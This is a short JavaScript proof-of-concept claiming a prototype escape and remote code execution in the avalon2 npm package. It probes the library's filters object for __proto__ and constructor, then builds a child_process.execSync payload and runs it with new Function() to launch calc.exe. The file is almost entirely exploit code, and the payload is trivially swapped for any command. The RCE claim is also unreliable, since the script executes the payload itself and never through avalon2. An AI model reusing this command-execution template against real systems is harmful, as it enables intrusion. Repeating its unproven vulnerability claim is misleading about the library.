/**
 * Avalon — Prototype Escape & RCE PoC
 * npm install avalon2 && node poc.js
 */

const avalon = require("avalon2");

console.log("=== Avalon Prototype Escape ===");
console.log("filters['__proto__']    →", avalon.filters["__proto__"] === Object.prototype ? "Object.prototype" : "?");
console.log("filters['constructor']  →", typeof avalon.filters["constructor"] === "function" ? "Object()" : "?");
console.log("filters['toString']     →", typeof avalon.filters["toString"] === "function" ? "Function" : "?");

console.log("\n=== RCE via new Function() ===");
console.log("Spawning calc.exe...");

const payload = 'process.mainModule.require("child_process").execSync("calc.exe")';
new Function('__vmodel__', 'return ' + payload + ';')();

console.log("✅ Calculator process spawned successfully.");
